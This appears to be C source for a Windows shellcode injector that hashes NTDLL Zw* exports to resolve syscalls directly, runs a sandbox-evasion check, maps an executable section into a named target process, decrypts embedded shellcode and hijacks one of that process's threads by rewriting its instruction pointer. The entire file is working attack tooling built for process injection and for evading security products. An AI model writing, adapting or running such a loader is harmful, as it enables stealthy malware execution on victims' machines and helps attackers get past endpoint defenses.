#pragma once
#include "MigleEarator.h"
#include "ChangeThese.h"

SW2_SYSCALL_LIST SW2_SyscallList;
DWORD SW2_HashSyscall(PCSTR FunctionName)
{
    DWORD i = 0;
    DWORD Hash = SW2_SEED;

    while (FunctionName[i])
    {
        WORD PartialName = *(WORD*)((ULONG64)FunctionName + i++);
        Hash ^= PartialName + SW2_ROR8(Hash);
    }

    return Hash;
}
BOOL SW2_PopulateSyscallList()
{
    // Return early if the list is already populated.
    if (SW2_SyscallList.Count) return TRUE;

    PSW2_PEB Peb = (PSW2_PEB)__readgsqword(0x60);
    PSW2_PEB_LDR_DATA Ldr = Peb->Ldr;
    PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
    PVOID DllBase = NULL;

    // Get the DllBase address of NTDLL.dll. NTDLL is not guaranteed to be the second
    // in the list, so it's safer to loop through the full list and find it.
    PSW2_LDR_DATA_TABLE_ENTRY LdrEntry;
    for (LdrEntry = (PSW2_LDR_DATA_TABLE_ENTRY)Ldr->Reserved2[1]; LdrEntry->DllBase != NULL; LdrEntry = (PSW2_LDR_DATA_TABLE_ENTRY)LdrEntry->Reserved1[0])
    {
        DllBase = LdrEntry->DllBase;
        PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
        PIMAGE_NT_HEADERS NtHeaders = SW2_RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
        PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
        DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (VirtualAddress == 0) continue;

        ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)SW2_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);

        // If this is NTDLL.dll, exit loop.
        PCHAR DllName = SW2_RVA2VA(PCHAR, DllBase, ExportDirectory->Name);

        if ((*(ULONG*)DllName | 0x20202020) != 'ldtn') continue;
        if ((*(ULONG*)(DllName + 4) | 0x20202020) == 'ld.l') break;
    }

    if (!ExportDirectory) return FALSE;

    DWORD NumberOfNames = ExportDirectory->NumberOfNames;
    PDWORD Functions = SW2_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
    PDWORD Names = SW2_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
    PWORD Ordinals = SW2_RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);

    // Populate SW2_SyscallList with unsorted Zw* entries.
    DWORD i = 0;
    PSW2_SYSCALL_ENTRY Entries = SW2_SyscallList.Entries;
    do
    {
        PCHAR FunctionName = SW2_RVA2VA(PCHAR, DllBase, Names[NumberOfNames - 1]);

        // Is this a system call?
        if (*(USHORT*)FunctionName == 'wZ')
        {
            Entries[i].Hash = SW2_HashSyscall(FunctionName);
            Entries[i].Address = Functions[Ordinals[NumberOfNames - 1]];

            i++;
            if (i == SW2_MAX_ENTRIES) break;
        }
    } while (--NumberOfNames);

    // Save total number of system calls found.
    SW2_SyscallList.Count = i;

    // Sort the list by address in ascending order.
    for (DWORD i = 0; i < SW2_SyscallList.Count - 1; i++)
    {
        for (DWORD j = 0; j < SW2_SyscallList.Count - i - 1; j++)
        {
            if (Entries[j].Address > Entries[j + 1].Address)
            {
                // Swap entries.
                SW2_SYSCALL_ENTRY TempEntry;

                TempEntry.Hash = Entries[j].Hash;
                TempEntry.Address = Entries[j].Address;

                Entries[j].Hash = Entries[j + 1].Hash;
                Entries[j].Address = Entries[j + 1].Address;

                Entries[j + 1].Hash = TempEntry.Hash;
                Entries[j + 1].Address = TempEntry.Address;
            }
        }
    }

    return TRUE;
}
EXTERN_C DWORD SW2_GetSyscallNumber(DWORD FunctionHash)
{
    // Ensure SW2_SyscallList is populated.
    if (!SW2_PopulateSyscallList()) return -1;

    for (DWORD i = 0; i < SW2_SyscallList.Count; i++)
    {
        if (FunctionHash == SW2_SyscallList.Entries[i].Hash)
        {
            return i;
        }
    }

    return -1;
}


int main()
{
    if (!SandBoxEvasion())
    {
        return 1;
    }


    //Some boring struct definitions...
    HANDLE sectionHandle = NULL;
    SIZE_T shellcodesize = sizeof(rawData);
    LARGE_INTEGER sectionSize = { shellcodesize };
    PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;
    OBJECT_ATTRIBUTES SectionObjectAttributes;
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    HANDLE threadHijacked = NULL;
    HANDLE Threadsnapshot;
    ULONG suspendcount;
    THREADENTRY32 threadEntry;
    threadEntry.dwSize = sizeof(THREADENTRY32);
    InitializeObjectAttributes(&SectionObjectAttributes, NULL, 0, NULL, NULL);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    CLIENT_ID uPid = { 0 };
    DWORD LaPID = GetProcessIDFromName(WHERETOMIGRATE);
    HANDLE notreallyhandle = (void*)LaPID;
    uPid.UniqueThread = (HANDLE)0;
    uPid.UniqueProcess = notreallyhandle;
    HANDLE targetHandle = NULL;
    OBJECT_ATTRIBUTES ObjectAttributes;
    PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
    Threadsnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    
    

    NtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, &SectionObjectAttributes, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    NtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &shellcodesize, 2, NULL, PAGE_READWRITE);
    NtOpenProcess(&targetHandle, PROCESS_ALL_ACCESS, &ObjectAttributes, &uPid);
    Thread32First(snapshot, &threadEntry);

    //Thread walking
    OBJECT_ATTRIBUTES ThreadObjectAttributes;
    InitializeObjectAttributes(&ThreadObjectAttributes, NULL, 0, NULL, NULL);
    int counter = 0;//To avoid hijacking the first thread
    while (Thread32Next(snapshot, &threadEntry))
    {
        if (threadEntry.th32OwnerProcessID == LaPID && counter > 1)
        {
            uPid.UniqueThread = (void*)threadEntry.th32ThreadID;
            NtOpenThread(&threadHijacked, THREAD_ALL_ACCESS, &ThreadObjectAttributes, &uPid);
            break;
        }
        counter++;
    }
    NtSuspendThread(threadHijacked, &suspendcount);
    NtGetContextThread(threadHijacked, &context);
    NtMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &shellcodesize, 2, NULL, PAGE_EXECUTE_READ);
    decrypt();
    memcpy(localSectionAddress, &rawData, shellcodesize);
    context.Rip = (DWORD_PTR)remoteSectionAddress; //Yes, very aggresive and will eventually cause the program to crash once the shellcode finishes its execution
    NtSetContextThread(threadHijacked, &context);
    NtResumeThread(threadHijacked, &suspendcount);
    return 0;
}